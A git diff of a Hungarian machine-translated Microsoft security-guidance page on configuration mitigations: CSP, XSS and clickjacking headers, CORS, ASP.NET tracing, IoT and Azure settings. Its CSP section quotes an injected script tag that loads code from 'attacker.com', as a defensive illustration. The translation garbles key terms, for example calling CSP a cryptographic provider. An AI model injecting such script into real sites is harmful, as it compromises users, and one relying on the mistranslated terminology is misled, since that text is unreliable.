@@ -14,12 +14,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 08/17/2017
 ms.author: rodsan
-ms.openlocfilehash: 1f3de9ba6615a9b2232cca237a822b308d89426d
-ms.sourcegitcommit: 9890483687a2b28860ec179f5fd0a292cdf11d22
+ms.openlocfilehash: cea96234083abd01cdf280129e6f75a1f69af9c6
+ms.sourcegitcommit: 150a40d8ba2beaf9e22b6feff414f8298a8ef868
 ms.translationtype: MT
 ms.contentlocale: hu-HU
-ms.lasthandoff: 01/24/2018
-ms.locfileid: "28019823"
+ms.lasthandoff: 06/27/2018
+ms.locfileid: "37028982"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Biztonsági keret: Konfigurációkezelés |} Megoldást 
 | A termék vagy szolgáltatás | Cikk |
@@ -39,10 +39,10 @@ ms.locfileid: "28019823"
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [Tartalom biztonsági házirend bemutatása](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [tartalom biztonsági szabályzatainak ismertetése](http://content-security-policy.com/), [biztonsági funkciók](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [tartalom biztonsági házirendbemutatása](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Használható CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
+| **Hivatkozások**              | [Tartalom biztonsági házirend bemutatása](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [tartalom biztonsági szabályzatainak ismertetése](http://content-security-policy.com/), [biztonsági funkciók](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [tartalom biztonsági házirend bemutatása](https://docs.webplatform.org/wiki/tutorials/content-security-policy) , [Használható CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
 | **Lépések** | <p>Tartalom biztonsági házirend (CSP), akkor egy védelemmel az olyan jellegű biztonsági eszköz, a W3C szabvány, amely lehetővé teszi az alkalmazástulajdonosok webes ellenőrzése a tartalmat a helyükön lévő beágyazott. Kriptográfiai Szolgáltató a webkiszolgálón HTTP-válaszfejléc meg van adva, és kikényszeríti a ügyféloldali böngészőkben. Egy engedélyezési lista-alapú házirend - webhely deklarálhatnak mely aktív tartalom a megbízható tartományok készlete, például JavaScript tölthetők be.</p><p>Kriptográfiai Szolgáltató a következő biztonsági előnyöket nyújtja:</p><ul><li>**Védelmet biztosít a lehetővé:** Ha egy lap lehetővé téve, egy támadó kihasználhatja azt 2 módon:<ul><li>Szúrjon `<script>malicious code</script>`. A biztonsági rés nem fog működni a felhőbeli Szolgáltató talál korlátozás-1 miatt</li><li>Szúrjon `<script src=”http://attacker.com/maliciousCode.js”/>`. A biztonsági rés nem fog működni, mivel az általa tartomány nem a felhőbeli Szolgáltató engedélyezett tartományok</li></ul></li><li>**Adatok exfiltration szabályozhatják:** Ha bármely rosszindulatú tartalmat weblapon megkísérli a külső webhelyek csatlakozhat, és ellopják adatok, a kapcsolat megszakította CSP-hez. Ez azért, mert a célként megadott tartomány nem lesz a felhőbeli Szolgáltató engedélyezési lista</li><li>**Kattintson az-emelési elleni védelmet:** kattintson-emelési egy támadási módszer használatával, amely egy ellenfél is keret a tényleges webhely és a kényszerített felhasználók felhasználói felületi elemei. Jelenleg kattintson-emelési elleni védelmet egy fejléc-X-keret-válaszbeállítások beállításával valósul meg. Nem minden böngésző, figyelembe vegyék ezt a fejlécet, és előre CSP is szabványos módon kattintson-emelési elleni védelemre</li><li>**Valós idejű támadás reporting:** Ha injektálási támadást egy CSP-kompatibilis webhelyen van, böngészők automatikusan vált az a webkiszolgálón beállított végpont üzenetszintű értesítést. Ezzel a módszerrel CSP valós idejű figyelmeztető rendszer funkcionál.</li></ul> |
 
 ### <a name="example"></a>Példa
@@ -71,18 +71,18 @@ Example: var str="alert(1)"; eval(str);
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [Lehetővé védelmi szűrő](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
-| **Lépések** | <p>X-lehetővé-védelmet válasz konfiguráció szabályozza a böngésző helyközi parancsfájl szűrő. A válasz fejléce a következő értékeket veheti fel:</p><ul><li>`0:`Ezzel a lépéssel letiltja a szűrő</li><li>`1: Filter enabled`Ha egy többhelyes parancsfájl-kezelési támogatás észlel, ahhoz, hogy a támadást, állítsa le a böngésző fog sanitize a lap</li><li>`1: mode=block : Filter enabled`. Ahelyett, hogy a lap sanitize, a lehetővé támadás észlelése esetén, mint a böngésző megakadályozza, hogy az oldal megjelenítési</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. A böngésző sanitize a lapot, és a jelentést a megsértése.</li></ul><p>Ez az okhoz CSP megsértése jelentések küldése az Ön által választott URI króm függvényt. Az elmúlt 2 beállítások biztonságos értékek számítanak.</p>|
+| **Lépések** | <p>X-lehetővé-védelmet válasz konfiguráció szabályozza a böngésző helyközi parancsfájl szűrő. A válasz fejléce a következő értékeket veheti fel:</p><ul><li>`0:` Ezzel a lépéssel letiltja a szűrő</li><li>`1: Filter enabled` Ha egy többhelyes parancsfájl-kezelési támogatás észlel, ahhoz, hogy a támadást, állítsa le a böngésző fog sanitize a lap</li><li>`1: mode=block : Filter enabled`. Ahelyett, hogy a lap sanitize, a lehetővé támadás észlelése esetén, mint a böngésző megakadályozza, hogy az oldal megjelenítési</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. A böngésző sanitize a lapot, és a jelentést a megsértése.</li></ul><p>Ez az okhoz CSP megsértése jelentések küldése az Ön által választott URI króm függvényt. Az elmúlt 2 beállítások biztonságos értékek számítanak.</p>|
 
 ## <a id="trace-deploy"></a>ASP.NET-alkalmazások telepítését megelőzően nyomkövetéséhez és le kell tiltania
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [ASP.NET Debugging Overview](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET követés áttekintése](http://msdn2.microsoft.com/library/bb386420.aspx), [How to: enable Tracing for ASP.NET-alkalmazás engedélyezése](http://msdn2.microsoft.com/library/0x5wc973.aspx), [hogyan: az ASP.NET-alkalmazások hibakeresés engedélyezése](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
@@ -93,7 +93,7 @@ Example: var str="alert(1)"; eval(str);
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
@@ -104,10 +104,10 @@ Example: var str="alert(1)"; eval(str);
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [Védelmi Cheat lap kattintson-emelési OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - elleni kattintson-emelési az X-keret-beállítások](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
+| **Hivatkozások**              | [Védelmi Cheat lap kattintson-emelési OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - elleni kattintson-emelési az X-keret-beállítások](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
 | **Lépések** | <p>kattintással emelési néven is ismert a "felhasználói felület jogorvoslati támadás", akkor, ha egy támadó használ több átlátszó vagy nem átlátszó réteg felhasználót: a felhasználó a gombra kattintva vagy csatlakoztatása egy másik lapon, ha azok volt kívánó lapon a legfelső szintű.</p><p>Ez a réteges létrehozásával egy rosszindulatú lapon iframe, amely betölti az áldozat oldalon érhető el. Ebből kifolyólag a támadó "térít" gombra kell kattintania azt jelentette, hogy a lap és útválasztási őket egy másik lapra, nagy valószínűséggel tulajdonosa egy másik alkalmazás, tartomány, vagy mindkettőt. Kattintson az-emelési támadások megelőzése érdekében állítsa be a megfelelő X-keret-beállítások HTTP-válaszfejlécek, melyek arra utasítják a böngésző számára más tartományokból keretezési engedélyezi</p>|
 
 ### <a name="example"></a>Példa
@@ -139,11 +139,11 @@ Web.config kód csak keretezhető ugyanabban a tartományban lap webhelyekhez:
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Web Forms keretrendszerre, MVC5 |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
-| **Lépések** | <p>Böngésző biztonsági megakadályozza, hogy egy weblap AJAX-kérelmek egy másik tartományra. Ez a korlátozás az azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságosan közzétételét mely más webhelyek is felhasználhatnak. Alhálózatok közötti Origin Resource Sharing (CORS), amely lehetővé teszi a kiszolgáló a azonos eredetű házirend enyhítése W3C szabvány. CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben.</p><p>A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák. A a fő CORS engedélyezése az eszköz néhány HTTP-válaszfejlécek hozzáadása (hozzáférés - vezérlési-*) a webes alkalmazás, és ez végezhető el több módon.</p>|
+| **Lépések** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ez a korlátozás az azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságosan közzétételét mely más webhelyek is felhasználhatnak. Alhálózatok közötti Origin Resource Sharing (CORS), amely lehetővé teszi a kiszolgáló a azonos eredetű házirend enyhítése W3C szabvány. CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben.</p><p>A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák. A a fő CORS engedélyezése az eszköz néhány HTTP-válaszfejlécek hozzáadása (hozzáférés - vezérlési-*) a webes alkalmazás, és ez végezhető el több módon.</p>|
 
 ### <a name="example"></a>Példa
 Ha Web.config rendelkezésére áll, majd a CORS segítségével is hozzáadhat a következő kódot: 
@@ -170,7 +170,7 @@ Vegye figyelembe, hogy nagyon fontos a győződjön meg arról, hogy a lista tar
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Web Forms keretrendszerre, MVC5 |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [Kérelem érvényesítése - parancsfájl támadások megelőzése](http://www.asp.net/whitepapers/request-validation) |
@@ -196,7 +196,7 @@ Vegye figyelembe, hogy érvényesítés kérése a szolgáltatás nem támogatot
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
@@ -207,7 +207,7 @@ Vegye figyelembe, hogy érvényesítés kérése a szolgáltatás nem támogatot
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [IE8 biztonsági rész V: átfogó védelmének](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-típus](http://en.wikipedia.org/wiki/Mime_type) |
@@ -272,7 +272,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | EnvironmentType – Azure |
 | **Hivatkozások**              | [A Windows Azure Web Sites általános jogú kiszolgálói fejlécek eltávolítása](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
@@ -283,7 +283,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Adatbázis | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | SQL Azure, OnPrem |
 | **Attribútumok**              | N/A, SQL verzió - 12-es verzió |
 | **Hivatkozások**              | [Egy Azure SQL database-tűzfal konfigurálásáról](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [beállítani a Windows tűzfalat a hozzáféréshez](https://msdn.microsoft.com/library/ms175043) |
@@ -294,11 +294,11 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Webes API | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | MVC 5 |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [Az ASP.NET Web API 2 eltérő eredetű kérések engedélyezése](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - ASP.NET Web API 2 a CORS-támogatás](https://msdn.microsoft.com/magazine/dn532203.aspx) |
-| **Lépések** | <p>Böngésző biztonsági megakadályozza, hogy egy weblap AJAX-kérelmek egy másik tartományra. Ez a korlátozás az azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságosan közzétételét mely más webhelyek is felhasználhatnak. Alhálózatok közötti Origin Resource Sharing (CORS), amely lehetővé teszi a kiszolgáló a azonos eredetű házirend enyhítése W3C szabvány.</p><p>CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben. A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák.</p>|
+| **Lépések** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ez a korlátozás az azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságosan közzétételét mely más webhelyek is felhasználhatnak. Alhálózatok közötti Origin Resource Sharing (CORS), amely lehetővé teszi a kiszolgáló a azonos eredetű házirend enyhítése W3C szabvány.</p><p>CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben. A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák.</p>|
 
 ### <a name="example"></a>Példa
 A App_Start/WebApiConfig.cs adja hozzá a következő kódot a WebApiConfig.Register metódus 
@@ -390,7 +390,7 @@ public class ResourcesController : ApiController
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Webes API | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | MVC 6 |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [Az ASP.NET Core 1.0 (CORS) eltérő eredetű kérések engedélyezése](https://docs.asp.net/en/latest/security/cors.html) |
@@ -482,7 +482,7 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Webes API | 
-| **SDL Phase**               | Környezet |  
+| **SDL fázis**               | Környezet |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [Útmutató: Az ASP.NET 2.0 használatával DPAPI konfigurációs szakasz titkosítása](https://msdn.microsoft.com/library/ff647398.aspx), [adja meg egy védett Konfigurációszolgáltatót](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Azure Key Vault használatával alkalmazás titkos kulcsok védelme](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
@@ -493,7 +493,7 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | IoT-eszközök | 
-| **SDL Phase**               | Környezet |  
+| **SDL fázis**               | Környezet |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
@@ -504,7 +504,7 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | IoT-eszközök | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [A biztonságos rendszerindítás és az AppLocker-bit Eszköztitkosítás a Windows 10 IoT Core engedélyezése](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
@@ -515,7 +515,7 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | IoT-eszközök | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
@@ -526,7 +526,7 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | IoT-eszközök | 
-| **SDL Phase**               | Környezet |  
+| **SDL fázis**               | Környezet |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
@@ -537,7 +537,7 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Az IoT-mező átjáró | 
-| **SDL Phase**               | Környezet |  
+| **SDL fázis**               | Környezet |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
@@ -548,7 +548,7 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Az IoT-mező átjáró | 
-| **SDL Phase**               | Környezet |  
+| **SDL fázis**               | Környezet |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
@@ -558,8 +558,8 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
-| **Összetevő**               | IoT Cloud Gateway | 
-| **SDL Phase**               | Felépítés |  
+| **Összetevő**               | Az IoT átjáró | 
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | Átjáró choice - Azure IoT Hub |
 | **Hivatkozások**              | [Az IoT Hub eszköz kezelése-áttekintés](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [eszköz belső vezérlőprogram frissítése](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
@@ -570,7 +570,7 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Gép megbízhatósági kapcsolat határán | 
-| **SDL Phase**               | Környezet |  
+| **SDL fázis**               | Környezet |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
@@ -581,7 +581,7 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Azure Storage | 
-| **SDL Phase**               | Környezet |  
+| **SDL fázis**               | Környezet |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [Az Azure Storage biztonsági útmutató - a Tárfiók kulcsait kezelése](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
@@ -592,7 +592,7 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Azure Storage | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [Az Azure Storage szolgáltatásainak CORS-támogatás](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
@@ -603,7 +603,7 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | WCF | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | .NET-keretrendszer 3 |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [erősítse meg Királyság](https://vulncat.fortify.com/en/vulncat/index.html) |
@@ -626,7 +626,7 @@ A következő egy példa konfiguráció sávszélesség-szabályozás engedélye
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | WCF | 
-| **SDL Phase**               | Felépítés |  
+| **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | .NET-keretrendszer 3 |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [erősítse meg Királyság](https://vulncat.fortify.com/en/vulncat/index.html) |
